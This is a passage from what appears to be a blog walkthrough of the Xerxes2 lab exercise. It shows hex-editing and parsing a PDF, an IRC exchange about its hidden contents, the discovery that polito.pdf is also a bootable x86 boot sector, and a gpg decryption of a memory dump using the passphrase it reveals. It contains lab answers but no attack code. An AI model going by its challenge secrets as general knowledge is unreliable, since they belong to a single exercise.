<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@pwk:~# cat pdf999_b
</span><span class='line'>h?h??!Y??MZt
</span><span class='line'>            ??????????U?u???????r?--WARNING--
</span><span class='line'>   Unauthorized file access will be reported.
</span><span class='line'>     XERXES wishes you
</span><span class='line'>          a most productive dayhowhYXh
</span><span class='line'>h7ihhzhOwh45h
</span><span class='line'>@hgIh ,h#ohMZh
</span><span class='line'>
</span><span class='line'>hNlhaWhFuhamh
</span><span class='line'> h: hishd horhswhash phheh
</span><span class='line'>T??U?%PDF-1.5
</span><span class='line'>%????
</span><span class='line'><span class="m">4</span> <span class="m">0</span> obj &lt;&lt;
</span><span class='line'>/Length <span class="m">292</span>
</span><span class='line'>/Filter /FlateDecode
</span><span class='line'>&gt;&gt;
</span><span class='line'>stream
</span><span class='line'>x?mQ?n?0
</span><span class='line'>        ??+<span class="p">|</span>+H#%I  ?4?ڪu?M<span class="se">\?</span>i
</span><span class='line'>??? ??
</span><span class='line'>      ????????Y?&gt;E?? ? ??p,<span class="o">(</span>?cJ??<span class="o">{</span>e??<span class="err">&quot;</span>y????0MgqY_?#<span class="o">(</span>s??M<span class="p">&amp;</span>e6??8?zm?A???????   M??q?--I?y?uZ^?Z???<span class="nv">$?</span>l??*c-tj?????v3ߴ~S?2&gt;<span class="o">[</span>5ZT9???g??M?aU_?????䟲??VY??<span class="o">=</span>?n?S?h?r?H?s<span class="p">&amp;</span><span class="sb">`</span>F?ry??ǆ??B/h?????mt?<span class="sb">``</span>?c?V?W??Ƨ?<span class="p">;</span>??<span class="p">|</span>?~ގ1??s5 ?????-9?0
</span><span class='line'>root@pwk:~#
</span></code></pre></td></tr></table></div></figure>


<p>I used a hexeditor to add the PDF header and footer information</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="m">00000000</span>   <span class="m">83</span> E0 FF EB  1F <span class="m">25</span> <span class="m">50</span> <span class="m">44</span>  <span class="m">46</span> 2D <span class="m">31</span> 2E  <span class="m">35</span> 0A <span class="m">68</span> E0  <span class="m">08</span> <span class="m">17</span> BC <span class="m">00</span>  <span class="m">10</span> <span class="m">68</span> C0 <span class="m">07</span>  .....%PDF-1.5.h......h..
</span><span class='line'><span class="m">00000018</span>   1F EB <span class="m">21</span> <span class="m">59</span>  <span class="m">81</span> F9 4D 5A  <span class="m">74</span> 0C B4 0E  <span class="m">86</span> C1 CD <span class="m">10</span>  <span class="m">86</span> C5 CD <span class="m">10</span>  EB ED BE <span class="m">55</span>  ..!Y..MZt..............U
</span><span class='line'><span class="m">00000030</span>   <span class="m">00</span> AC <span class="m">75</span> <span class="m">02</span>  EB FE B4 0E  CD <span class="m">10</span> EB F5  EB <span class="m">72</span> E9 2D  2D <span class="m">57</span> <span class="m">41</span> <span class="m">52</span>  4E <span class="m">49</span> 4E <span class="m">47</span>  ..u..........r.--WARNING
</span><span class='line'><span class="m">00000048</span>   2D 2D 0A <span class="m">20</span>  <span class="m">20</span> <span class="m">20</span> <span class="m">55</span> 6E  <span class="m">61</span> <span class="m">75</span> <span class="m">74</span> <span class="m">68</span>  6F <span class="m">72</span> <span class="m">69</span> 7A  <span class="m">65</span> <span class="m">64</span> <span class="m">20</span> <span class="m">66</span>  <span class="m">69</span> 6C <span class="m">65</span> <span class="m">20</span>  --.   Unauthorized file
</span><span class='line'><span class="m">00000060</span>   <span class="m">61</span> <span class="m">63</span> <span class="m">63</span> <span class="m">65</span>  <span class="m">73</span> <span class="m">73</span> <span class="m">20</span> <span class="m">77</span>  <span class="m">69</span> 6C 6C <span class="m">20</span>  <span class="m">62</span> <span class="m">65</span> <span class="m">20</span> <span class="m">72</span>  <span class="m">65</span> <span class="m">70</span> 6F <span class="m">72</span>  <span class="m">74</span> <span class="m">65</span> <span class="m">64</span> 2E  access will be reported.
</span><span class='line'><span class="m">00000078</span>   0A <span class="m">20</span> <span class="m">20</span> <span class="m">20</span>  <span class="m">20</span> <span class="m">20</span> <span class="m">58</span> <span class="m">45</span>  <span class="m">52</span> <span class="m">58</span> <span class="m">45</span> <span class="m">53</span>  <span class="m">20</span> <span class="m">77</span> <span class="m">69</span> <span class="m">73</span>  <span class="m">68</span> <span class="m">65</span> <span class="m">73</span> <span class="m">20</span>  <span class="m">79</span> 6F <span class="m">75</span> 0A  .     XERXES wishes you.
</span><span class='line'><span class="m">00000090</span>   <span class="m">20</span> <span class="m">20</span> <span class="m">20</span> <span class="m">20</span>  <span class="m">20</span> <span class="m">20</span> <span class="m">20</span> <span class="m">20</span>  <span class="m">20</span> <span class="m">20</span> <span class="m">61</span> <span class="m">20</span>  6D 6F <span class="m">73</span> <span class="m">74</span>  <span class="m">20</span> <span class="m">70</span> <span class="m">72</span> 6F  <span class="m">64</span> <span class="m">75</span> <span class="m">63</span> <span class="m">74</span>            a most product
</span><span class='line'>000000A8   <span class="m">69</span> <span class="m">76</span> <span class="m">65</span> <span class="m">20</span>  <span class="m">64</span> <span class="m">61</span> <span class="m">79</span> <span class="m">00</span>  <span class="m">68</span> 6F <span class="m">77</span> <span class="m">68</span>  <span class="m">59</span> <span class="m">58</span> <span class="m">68</span> 0D  0A <span class="m">68</span> <span class="m">37</span> <span class="m">69</span>  <span class="m">68</span> <span class="m">68</span> 7A <span class="m">68</span>  ive day.howhYXh..h7ihhzh
</span><span class='line'>000000C0   4F <span class="m">77</span> <span class="m">68</span> <span class="m">34</span>  <span class="m">35</span> <span class="m">68</span> 0A <span class="m">40</span>  <span class="m">68</span> <span class="m">67</span> <span class="m">49</span> <span class="m">68</span>  <span class="m">20</span> 2C <span class="m">68</span> <span class="m">23</span>  6F <span class="m">68</span> 4D 5A  <span class="m">68</span> 0A 0A <span class="m">68</span>  Owh45h.@hgIh ,h#ohMZh..h
</span><span class='line'>000000D8   4E 6C <span class="m">68</span> <span class="m">61</span>  <span class="m">57</span> <span class="m">68</span> <span class="m">46</span> <span class="m">75</span>  <span class="m">68</span> <span class="m">61</span> 6D <span class="m">68</span>  0A <span class="m">20</span> <span class="m">68</span> 3A  <span class="m">20</span> <span class="m">68</span> <span class="m">69</span> <span class="m">73</span>  <span class="m">68</span> <span class="m">64</span> <span class="m">20</span> <span class="m">68</span>  NlhaWhFuhamh. h: hishd h
</span><span class='line'>000000F0   6F <span class="m">72</span> <span class="m">68</span> <span class="m">73</span>  <span class="m">77</span> <span class="m">68</span> <span class="m">61</span> <span class="m">73</span>  <span class="m">68</span> <span class="m">20</span> <span class="m">70</span> <span class="m">68</span>  <span class="m">68</span> <span class="m">65</span> <span class="m">68</span> 0A  <span class="m">54</span> E9 <span class="m">17</span> FF  <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>  orhswhash phheh.T.......
</span><span class='line'><span class="m">00000108</span>   <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>  <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>  <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>  <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>  <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>  <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>  ........................
</span><span class='line'><span class="m">00000120</span>   <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>  <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>  <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>  <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>  <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>  <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>  ........................
</span><span class='line'><span class="m">00000138</span>   <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>  <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>  <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>  <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>  <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>  <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>  ........................
</span><span class='line'><span class="m">00000150</span>   <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>  <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>  <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>  <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>  <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>  <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>  ........................
</span><span class='line'><span class="m">00000168</span>   <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>  <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>  <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>  <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>  <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>  <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>  ........................
</span><span class='line'><span class="m">00000180</span>   <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>  <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>  <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>  <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>  <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>  <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>  ........................
</span><span class='line'><span class="m">00000198</span>   <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>  <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>  <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>  <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>  <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>  <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>  ........................
</span><span class='line'>000001B0   <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>  <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>  <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>  <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>  <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>  <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>  ........................
</span><span class='line'>000001C8   <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>  <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>  <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>  <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>  <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>  <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>  ........................
</span><span class='line'>000001E0   <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>  <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>  <span class="m">55</span> AA <span class="m">25</span> <span class="m">50</span>  <span class="m">44</span> <span class="m">46</span> 2D <span class="m">31</span>  2E <span class="m">35</span> 0A <span class="m">25</span>  D0 D4 C5 D8  ........U.%PDF-1.5.%....
</span><span class='line'>000001F8   0A <span class="m">34</span> <span class="m">20</span> <span class="m">30</span>  <span class="m">20</span> 6F <span class="m">62</span> 6A  <span class="m">20</span> 3C 3C 0A  2F 4C <span class="m">65</span> 6E  <span class="m">67</span> <span class="m">74</span> <span class="m">68</span> <span class="m">20</span>  <span class="m">32</span> <span class="m">39</span> <span class="m">32</span> <span class="m">20</span>  .4 <span class="m">0</span> obj &lt;&lt;./Length 292
</span><span class='line'><span class="m">00000210</span>   <span class="m">20</span> <span class="m">20</span> <span class="m">20</span> <span class="m">20</span>  <span class="m">20</span> <span class="m">20</span> 0A 2F  <span class="m">46</span> <span class="m">69</span> 6C <span class="m">74</span>  <span class="m">65</span> <span class="m">72</span> <span class="m">20</span> 2F  <span class="m">46</span> 6C <span class="m">61</span> <span class="m">74</span>  <span class="m">65</span> <span class="m">44</span> <span class="m">65</span> <span class="m">63</span>        ./Filter /FlateDec
</span><span class='line'><span class="m">00000228</span>   6F <span class="m">64</span> <span class="m">65</span> 0A  3E 3E 0A <span class="m">73</span>  <span class="m">74</span> <span class="m">72</span> <span class="m">65</span> <span class="m">61</span>  6D 0A <span class="m">78</span> DA  6D <span class="m">51</span> C1 6E  <span class="m">83</span> <span class="m">30</span> 0C BD  ode.&gt;&gt;.stream.x.mQ.n.0..
</span><span class='line'><span class="m">00000240</span>   E7 2B 7C 2B  <span class="m">48</span> <span class="m">23</span> <span class="m">25</span> <span class="m">49</span>  <span class="m">09</span> E1 <span class="m">34</span> A9  DA AA <span class="m">75</span> B7  4D 5C A6 <span class="m">69</span>  <span class="m">07</span> 0A A1 A0  .+<span class="p">|</span>+H#%I..4...u.M<span class="se">\.</span>i....
</span><span class='line'><span class="m">00000258</span>   <span class="m">15</span> C2 <span class="m">20</span> <span class="m">19</span>  E2 EF <span class="m">07</span> 0B  <span class="m">91</span> B6 AA 8A  <span class="m">14</span> 3F DB CF  EF <span class="m">59</span> C9 3E  <span class="m">45</span> DB <span class="m">03</span> <span class="m">89</span>  .. ..........?...Y.&gt;E...
</span><span class='line'><span class="m">00000270</span>   <span class="m">20</span> C1 <span class="m">09</span> A7  1C D2 <span class="m">12</span> <span class="m">08</span>  8D <span class="m">70</span> 2C <span class="m">28</span>  F0 <span class="m">98</span> <span class="m">63</span> 4A  <span class="m">19</span> A4 <span class="m">05</span> BC  7B <span class="m">07</span> <span class="m">65</span> DA   ........p,<span class="o">(</span>..cJ....<span class="o">{</span>.e.
</span><span class='line'><span class="m">00000288</span>   C2 0F <span class="m">22</span> 1A  <span class="m">79</span> BA AA <span class="m">07</span>  8B F0 B6 <span class="m">30</span>  4D <span class="m">67</span> <span class="m">71</span> <span class="m">59</span>  5F E4 9D <span class="m">23</span>  <span class="m">28</span> <span class="m">73</span> AE B4  ..<span class="err">&quot;</span>.y......0MgqY_..#<span class="o">(</span>s..
</span><span class='line'>000002A0   4D <span class="m">26</span> <span class="m">65</span> <span class="m">36</span>  <span class="m">85</span> A3 <span class="m">38</span> <span class="m">89</span>  7A 6D 9A <span class="m">41</span>  <span class="m">96</span> E6 <span class="m">82</span> FD  8F F4 <span class="m">19</span> <span class="m">42</span>  <span class="m">08</span> <span class="m">88</span> C0 <span class="m">09</span>  M<span class="p">&amp;</span>e6..8.zm.A.......B....
</span><span class='line'>000002B8   4D AC E1 <span class="m">71</span>  F3 2D 2D <span class="m">49</span>  B6 <span class="m">79</span> 3F <span class="m">75</span>  5A 5E CD 5A  <span class="m">97</span> D5 F2 <span class="m">24</span>  F3 6C <span class="m">16</span> B3  M..q.--I.y?uZ^.Z...<span class="nv">$.</span>l..
</span><span class='line'>000002D0   <span class="m">89</span> 2A 1D <span class="m">63</span>  2D <span class="m">74</span> 6A <span class="m">94</span>  FD E0 8A <span class="m">99</span>  <span class="m">76</span> <span class="m">33</span> <span class="m">18</span> DF  B4 7E <span class="m">53</span> C6  <span class="m">32</span> 3E 5B <span class="m">35</span>  .*.c-tj.....v3...~S.2&gt;<span class="o">[</span>5
</span><span class='line'>000002E8   5A <span class="m">54</span> <span class="m">39</span> A0  <span class="m">95</span> 8D <span class="m">67</span> A9  AF 4D B2 <span class="m">61</span>  <span class="m">18</span> <span class="m">55</span> 5F AC  1B F5 F5 FC  <span class="m">04</span> F7 B7 E4  ZT9...g..M.a.U_.........
</span><span class='line'><span class="m">00000300</span>   9F B2 AE 9B  <span class="m">56</span> <span class="m">59</span> D3 EA  BA 3D FF 6E  <span class="m">81</span> 1E <span class="m">53</span> F4  <span class="m">85</span> <span class="m">68</span> <span class="m">18</span> C2  <span class="m">72</span> <span class="m">96</span> <span class="m">48</span> <span class="m">92</span>  ....VY...<span class="o">=</span>.n..S..h..r.H.
</span><span class='line'><span class="m">00000318</span>   <span class="m">18</span> <span class="m">73</span> <span class="m">26</span> <span class="m">60</span>  <span class="m">17</span> <span class="m">46</span> <span class="m">98</span> <span class="m">72</span>  <span class="m">01</span> <span class="m">79</span> <span class="m">83</span> B6  C7 <span class="m">86</span> C0 <span class="m">83</span>  <span class="m">42</span> 2F <span class="m">68</span> BF  FC 9B F8 F3  .s<span class="p">&amp;</span><span class="sb">`</span>.F.r.y......B/h.....
</span><span class='line'><span class="m">00000330</span>   6D <span class="m">74</span> <span class="m">97</span> <span class="m">60</span>  1E <span class="m">11</span> <span class="m">60</span> <span class="m">82</span>  <span class="m">63</span> C6 <span class="m">56</span> AF  <span class="m">57</span> D9 C8 C6  A7 C2 3B F9  C1 7C CB 7E  mt.<span class="sb">`</span>..<span class="sb">`</span>.c.V.W.....<span class="p">;</span>..<span class="p">|</span>.~
</span><span class='line'><span class="m">00000348</span>   DE 8E <span class="m">31</span> E6  F5 <span class="m">73</span> <span class="m">35</span> <span class="m">20</span>  DE FF 9E DB  E2 <span class="m">07</span> 2D <span class="m">39</span>  <span class="m">89</span> <span class="m">30</span> 0A <span class="m">65</span>  6E <span class="m">64</span> <span class="m">73</span> <span class="m">74</span>  ..1..s5 ......-9.0.endst
</span><span class='line'><span class="m">00000360</span>   <span class="m">72</span> <span class="m">65</span> <span class="m">61</span> 6D  0A <span class="m">65</span> 6E <span class="m">64</span>  6F <span class="m">62</span> 6A <span class="m">20</span>  <span class="m">25</span> <span class="m">25</span> <span class="m">45</span> 4F  <span class="m">46</span> 0A                     ream.endobj %%EOF.
</span></code></pre></td></tr></table></div></figure>


<p>I was then able to run this through pdf-parser again to get to object 4. Now, I wont show you that, what I will do is show you this conversation&hellip;</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>9:34 AM &lt;recrudesce&gt; yeah
</span><span class='line'>9:35 AM &lt;recrudesce&gt; oooh, interesting
</span><span class='line'>9:35 AM &lt;recrudesce&gt; PDF Comment &#39;%\xd0\xd4\xc5\xd8\n&#39;
</span><span class='line'>9:35 AM &lt;recrudesce&gt; dunno if that&#39;s just because of the way i&#39;ve made the file
</span><span class='line'>9:39 AM &lt;recrudesce&gt; root@pwk:~# pdf-parser -w out.pdf
</span><span class='line'>9:39 AM &lt;recrudesce&gt; PDF Comment %PDF-1.5
</span><span class='line'>9:39 AM &lt;recrudesce&gt; PDF Comment %????
</span><span class='line'>9:39 AM &lt;recrudesce&gt; obj 4 0
</span><span class='line'>9:39 AM &lt;recrudesce&gt;  Type:
</span><span class='line'>9:39 AM &lt;recrudesce&gt;  Referencing:
</span><span class='line'>9:39 AM &lt;recrudesce&gt;  Contains stream
</span><span class='line'>9:39 AM &lt;recrudesce&gt;   &lt;&lt;
</span><span class='line'>9:39 AM &lt;recrudesce&gt;     /Length 292
</span><span class='line'>9:39 AM &lt;recrudesce&gt;     /Filter /FlateDecode
</span><span class='line'>9:39 AM &lt;recrudesce&gt;   &gt;&gt;
</span><span class='line'>9:39 AM &lt;recrudesce&gt; PDF Comment %%EOF
</span><span class='line'>9:39 AM &lt;recrudesce&gt; so i can see the stream
</span><span class='line'>9:39 AM &lt;recrudesce&gt; OH
</span><span class='line'>9:39 AM &lt;recrudesce&gt; MY
</span><span class='line'>9:39 AM &lt;recrudesce&gt; GOD
</span><span class='line'>9:40 AM &lt;recrudesce&gt;  /F15 9.9626 Tf 125.782 676.223 Td [(Found)-525(this)-525(./dump)-525(file,)-525(thought)-525(you&#39;d)-525(find)-525(it)-525(useful.)]TJ 0 -18.929 Td [(I&#39;ve)-525(encrypted)-525(it)-525(though,)-525(because)-525(of)-525(the)-525(powers)-525(that)-525(be...)]TJ 0 -18.929 Td [(You)-525(know)-525(how)-525(to)-525(get)-525(the)-525(password,)-525(right?)]TJ 0 -18.929 Td [(Happy)-525(hunting.)]TJ
</span><span class='line'>9:40 AM &lt;recrudesce&gt; 200 0 0 200 197.638 405.268 cm
</span><span class='line'>9:40 AM &lt;recrudesce&gt; Q
</span><span class='line'>9:40 AM &lt;recrudesce&gt; BT
</span><span class='line'>9:40 AM &lt;recrudesce&gt; 200 0 0 200 197.638 405.268 cm
</span><span class='line'>9:40 AM &lt;recrudesce&gt; Q
</span><span class='line'>9:40 AM &lt;recrudesce&gt; BT
</span><span class='line'>9:40 AM &lt;recrudesce&gt; ./F8 9.9626 Tf 249.651 386.339 Td [(Remem)28(b)-28(er,)-333(rem)-1(em)28(b)-28(er)]TJ
</span><span class='line'>9:46 AM &lt;superkojiman&gt; :)
</span><span class='line'>9:46 AM &lt;superkojiman&gt; will play with it tonight. if i start ita t work i won’t get anything done
</span><span class='line'>9:46 AM &lt;recrudesce&gt; i need to decode that file
</span><span class='line'>9:46 AM &lt;recrudesce&gt; where is the qr code ?
</span><span class='line'>9:47 AM &lt;superkojiman&gt; it&#39;s in the pdf.
</span><span class='line'>9:47 AM &lt;superkojiman&gt; polito.pdf
</span><span class='line'>9:49 AM &lt;recrudesce&gt; when i open that file i just get blank
</span><span class='line'>9:49 AM &lt;recrudesce&gt; is it one of the streams ?
</span><span class='line'>9:49 AM &lt;recrudesce&gt; ah, it&#39;ll be that 200x200 image
</span><span class='line'>9:49 AM &lt;recrudesce&gt; which i&#39;ve not been able to get yet
</span><span class='line'>9:49 AM &lt;superkojiman&gt; weird.
</span><span class='line'>9:49 AM &lt;recrudesce&gt; how did you extract it ?
</span><span class='line'>9:49 AM &lt;superkojiman&gt; it just shows on mine. :-/
</span><span class='line'>9:49 AM &lt;recrudesce&gt; the PDF for me is completely blank
</span><span class='line'>9:49 AM &lt;superkojiman&gt; opened it up in kali
</span><span class='line'>9:49 AM &lt;superkojiman&gt; really?
</span><span class='line'>9:49 AM &lt;recrudesce&gt; i&#39;ll try again
</span><span class='line'>9:51 AM &lt;superkojiman&gt; i&#39;m using epdfview
</span><span class='line'>9:51 AM &lt;superkojiman&gt; apt-get install epdfview
</span><span class='line'>9:52 AM &lt;recrudesce&gt; wtf, it shows now
</span><span class='line'>9:52 AM &lt;superkojiman&gt; :D
</span><span class='line'>9:52 AM &lt;recrudesce&gt; so i just extracted all the text
</span><span class='line'>9:52 AM &lt;superkojiman&gt; was wondering why you were getting all excited when you extracted that.
</span><span class='line'>9:52 AM &lt;superkojiman&gt; i was like &quot;but i see it right here...&quot; :D
</span><span class='line'>9:53 AM &lt;recrudesce&gt; i made that a lot more complicated than i needed
</span><span class='line'>9:53 AM &lt;recrudesce&gt; feck
</span></code></pre></td></tr></table></div></figure>


<p>Turns out the PDF I had was corrupt, and that the actual PDF looks like this</p>

<p><a href="/images/xerxes2_006.png"><img src="/images/xerxes2_006.png" alt="xerxes2_006" /></a></p>

<p><img src="http://img3.wikia.nocookie.net/__cb20130417220142/mlp/images/6/61/FANMADE_Derp_by_WorkingOrder.gif" alt="" /></p>

<p>Well didn&rsquo;t I feel stupid ? The QR code decodes as &ldquo;XERXES is watching&hellip;&rdquo;, so that&rsquo;s not of any use either. There&rsquo;s got to be something still hidden in this PDF that I&rsquo;m not seeing.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@pwk:~# file polito.pdf
</span><span class='line'>polito.pdf: x86 boot sector, code offset 0xe0
</span></code></pre></td></tr></table></div></figure>


<p>Wait, wut ? A bootable PDF ?</p>

<p><img src="http://www.reactiongifs.us/wp-content/uploads/2013/12/blinking_sword_in_the_stone.gif" alt="" /></p>

<p>OK, so, how to I boot this PDF I wonder ? Well, turns out this technique has already been used by <a href="https://www.alchemistowl.org/pocorgtfo/pocorgtfo02.pdf">PoC||GTFO with their 2nd edition</a> - check out section 8 to see instructions on using qemu. X11 forwarding required - luckily I set up X11 forwarding ages ago. Using the command found in PoC||GTFO002, I ended up with the following screen</p>

<p><a href="/images/xerxes2_007.png"><img src="/images/xerxes2_007.png" alt="xerxes2_007" /></a></p>

<p>Nice, a password.  Lets get that dump file decrypted.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>polito@xerxes2:~<span class="nv">$ </span>gpg --output output.bin --decrypt dump.gpg
</span><span class='line'>gpg: CAST5 encrypted data
</span><span class='line'>Enter passphrase: amFuaWNl
</span><span class='line'>pg: encrypted with <span class="m">1</span> passphrase
</span><span class='line'>gpg: WARNING: message was not integrity protected
</span><span class='line'>polito@xerxes2:~<span class="nv">$ </span>ls -l output.bin
</span><span class='line'>-rw-r--r-- <span class="m">1</span> polito polito <span class="m">132120576</span> Aug  <span class="m">8</span> 11:55 output.bin
</span></code></pre></td></tr></table></div></figure>


<p>I am going to assume this is a memory dump, so I figured the first thing to do was to run strings on it - it scrolled text for ages&hellip; I need to be more defined.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
